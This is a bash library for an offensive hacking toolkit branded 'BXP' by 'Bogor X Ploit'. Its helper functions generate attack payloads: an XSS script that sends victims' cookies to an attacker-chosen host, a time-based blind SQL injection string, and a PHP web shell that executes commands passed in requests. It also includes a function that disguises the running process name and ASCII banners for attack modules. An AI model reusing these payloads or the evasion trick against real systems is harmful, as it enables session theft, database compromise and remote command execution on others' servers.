#!/usr/bin/env bash
# ============================================
#   BXP CORE LIBRARY v1.0
#   By Bogor X Ploit
# ============================================

export C='\033[0;36m'; export B='\033[0;34m'; export W='\033[1;37m'
export R='\033[0;31m'; export Y='\033[1;33m'; export G='\033[0;32m'; export N='\033[0m'

bxp_http_request() {
    local url="$1"; local payload="$2"
    local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) BXP-Engine/1.0"
    local response_time
    response_time=$(curl -s -A "$user_agent" -o /dev/null -w "%{time_total}" "${url}${payload}")
    echo "$response_time"
}

bxp_encode_b64() { echo -n "$1" | base64 -w 0; }
bxp_encode_hex() { echo -n "$1" | xxd -p | tr -d '\n'; }
bxp_encode_url() { python3 -c "import urllib.parse; print(urllib.parse.quote('''$1'''))" 2>/dev/null || echo "$1"; }

bxp_gen_xss() { echo "<script>new Image().src='http://${1}:2010/?c='+document.cookie;</script>"; }
bxp_gen_sqli() { echo "1' AND (SELECT 1 FROM (SELECT SLEEP(${1}))a)-- -"; }
bxp_gen_php_shell() { echo "<?php if(isset(\$_REQUEST['c'])){ system(\$_REQUEST['c']); } ?>"; }

bxp_hide_process() {
    if command -v exec >/dev/null; then exec -a "$1" bash; fi
}

bxp_check_root() {
    if [ "$(id -u)" -eq 0 ]; then echo "Root"; else echo "Non-Root"; fi
}

# --- HEADER ASCII ENGINE ---
bxp_ascii_title() {
    local title="$1"
    clear
    sleep 0.3
    if [ "$title" = "NYCTOPHOBIA" ]; then
        echo -e "${C}"
        cat <<'ASCII'
 _   _  __   __  ____  _____  ___   ____   _   _   ___   ____  ___   _    
| \ | | \ \ / / / ___||_   _|/ _ \ |  _ \ | | | | / _ \ | __ )|_ _| / \   
|  \| |  \ V / | |      | | | | | || |_) || |_| || | | ||  _ \ | | / _ \  
| |\  |   | |  | |___   | | | |_| ||  __/ |  _  || |_| || |_) || ||  _  | 
|_| \_|   |_|   \____|  |_|  \___/ |_|    |_| |_| \___/ |____/|___|_| |_| 
ASCII
        echo -e "${N}\n"
    elif [ "$title" = "SLEEP PARALYSIS" ]; then
        echo -e "${R}"
        cat <<'ASCII'
 ____  _      ____  ____  ____    ____    _    ____  _      __   __  ___  ____  
/ ___|| |    | ____|  _ \|  _ \  |  _ \  / \  |  _ \| |     \ \ / / / _ \|  _ \ 
\___ \| |    |  _| | |_) | |_) | | |_) |/ _ \ | |_) | |      \ V / | | | | |_) |
 ___) | |___ | |___|  __/|  __/  |  __// ___ \|  _ <| |___    | |  | |_| |  _ / 
|____/|_____||_____|_|   |_|     |_|  /_/   \_\_| \_\_____|   |_|   \___/|_| \_\
ASCII
        echo -e "${N}\n"
    elif [ "$title" = "NOCTURNAL DECAY" ]; then
        echo -e "${Y}"
        cat <<'ASCII'
 _   _  ____   ____  _____  _   _  ____    _     ____    ____   ____   _   __   __
| \ | |/ __ \ / ___||_   _|| | | ||  _ \  / \   |  _ \  |  _ \ / ___| / \  \ \ / /
|  \| | |  | | |      | |  | | | || |_) |/ _ \  | | | | | |_) | |    / _ \  \ V / 
| |\  | |__| | |___   | |  | |_| ||  _ <|  _  | | |_| | |  _ <| |___/ ___ \  | |  
|_| \_|\____/ \____|  |_|   \___/ |_| \_\_| |_| |____/  |_| \_\\____/_/   \_\ |_|  
ASCII
        echo -e "${N}\n"
    fi
    sleep 0.3
}
